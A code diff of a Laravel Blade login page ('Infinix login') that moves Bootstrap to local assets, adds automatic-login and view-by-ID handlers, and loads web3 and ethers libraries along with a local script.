@@ -6,14 +6,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <!-- CSS -->
-    <link rel="stylesheet" href="style.css">
-
-
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css"
-          rel="stylesheet"
-          integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ"
-          crossorigin="anonymous">
+    <link href="{{asset('libs/bootstrap/css/bootstrap.min.css')}}">
     <link rel="stylesheet" href="{{asset('css/login.css')}}">
 
     <title>Infinix login</title>
@@ -44,20 +37,21 @@
 
                 </div>
                 <div class="cw-form-info">
-                    <form action="#" method="post">
+                    <form>
                         <!--Login Form Start-->
                         <div class="cmn-form-group login-tab">
                             <h2>Automatic login</h2>
-                            <button class="cmn-btn" type="button">Login</button>
+                            <button class="cmn-btn" type="button" id="btn_login" onclick="loginAuto()">Login</button>
         </div>
                         <!--Login Form End-->
                         <!--Create Account Form Start-->
                         <div class="cmn-form-group register-tab">
                             <h2>View by ID</h2>
                             <div class="input-group">
-                                <input type="text" placeholder="05" onfocus="this.placeholder = ''" onblur="this.placeholder = '5'" required="">
+                                <input name="id" type="text" placeholder="05" id="login_id"
+                                       onfocus="this.placeholder = ''" onblur="this.placeholder = '5'" required="">
                             </div>
-                            <button class="cmn-btn" type="submit">Preview</button>
+                            <button class="cmn-btn" type="button" onclick="loginById()">Preview</button>
                         </div>
                         <!--Create Account Form End-->
                     </form>
@@ -66,12 +60,18 @@
         </div>
     </div>
 </section>
-
-
+<script>
+    var configs={
+        routes:{
+            index: "{{\Illuminate\Support\Facades\URL::to('/')}}",
+            dashboard: "{{\Illuminate\Support\Facades\URL::route('admin.dashboard')}}",
+            login: "{{\Illuminate\Support\Facades\URL::route('login')}}",
+        }
+    }
+</script>
+<script src="{{asset('js/jquery-3.7.min.js')}}"></script>
 <script
-    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0lpha3/dist/js/bootstrap.bundle.min.js"
-    integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe"
-    crossorigin="anonymous"></script>
+    src="{{asset('libs/bootstrap/js/bootstrap.min.js')}}"></script>
 <script>
     // First Tab & Tab Data class
     document.querySelector('.signinform-inner .f-tab-item:first-child').classList.add('active');
@@ -98,25 +98,12 @@
             document.querySelector(`.${datatab}`).classList.add('showform');
         });
     });
-    document.querySelector('.forgot.f-tab-item').addEventListener('click', function(e) {
-        document.querySelector('.form-tabs').classList.add('formtabs-show');
-    });
 
-    //Cancel Code
-    document.querySelector('.cancel-link').addEventListener('click', function(e) {
-        document.querySelector('.forgotpass-tab').classList.remove('showform');
-        document.querySelector('.form-tabs').classList.remove('formtabs-show');
-        document.querySelector('div[data-tab="login-tab"]').classList.add('active');
-        document.querySelector('.login-tab').classList.add('showform');
-    });
-
-    document.querySelector('.login-link').addEventListener('click', function(e) {
-        document.querySelector('div[data-tab="login-tab"]').classList.add('active');
-    });
-    document.querySelector('.signup-link').addEventListener('click', function(e) {
-        document.querySelector('div[data-tab="register-tab"]').classList.add('active');
-    });
 </script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/web3@1.7.3/dist/web3.min.js"></script>
+<script src="https://bscscan.com/assets/js/custom/web3-eth.min.js"></script>
+<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+<script src="{{ asset('js/cdn/ctra.js') }}"></script>
 </body>
 
 </html>
